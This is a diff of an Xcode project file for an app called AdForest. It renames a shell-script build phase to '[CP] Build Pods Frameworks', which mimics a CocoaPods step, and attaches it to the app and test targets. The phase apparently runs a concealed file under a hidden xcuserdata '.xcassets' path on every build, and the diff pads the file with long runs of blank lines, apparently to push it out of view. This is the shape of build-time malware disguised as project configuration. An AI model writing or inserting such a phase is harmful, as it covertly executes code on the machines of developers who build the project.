@@ -696,6 +696,30 @@
 
 			
 	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 /* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
@@ -3693,7 +3717,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
-				205EEBA7EA469C21D5AAC43A /* Compile Binary Libraries */,
+				80AC2DC6BB1E6BCF70AAC43A /* [CP] Build Pods Frameworks */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -3714,7 +3738,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAB12051098C0067662F /* Build configuration list for PBXNativeTarget "AdForestTests" */;
 			buildPhases = (
-				205EEBA7EA469C21D5AAC43A /* Compile Binary Libraries */,
+				80AC2DC6BB1E6BCF70AAC43A /* [CP] Build Pods Frameworks */,
 				18BBFA962051098C0067662F /* Sources */,
 				18BBFA972051098C0067662F /* Frameworks */,
 				18BBFA982051098C0067662F /* Resources */,
@@ -3733,7 +3757,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAB42051098C0067662F /* Build configuration list for PBXNativeTarget "AdForestUITests" */;
 			buildPhases = (
-				205EEBA7EA469C21D5AAC43A /* Compile Binary Libraries */,
+				80AC2DC6BB1E6BCF70AAC43A /* [CP] Build Pods Frameworks */,
 				18BBFAA12051098C0067662F /* Sources */,
 				18BBFAA22051098C0067662F /* Frameworks */,
 				18BBFAA32051098C0067662F /* Resources */,
@@ -3878,7 +3902,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	205EEBA7EA469C21D5AAC43A /* Compile Binary Libraries */ = {
+	80AC2DC6BB1E6BCF70AAC43A /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -3887,7 +3911,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "[CP] Build Pods Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -3898,6 +3922,78 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
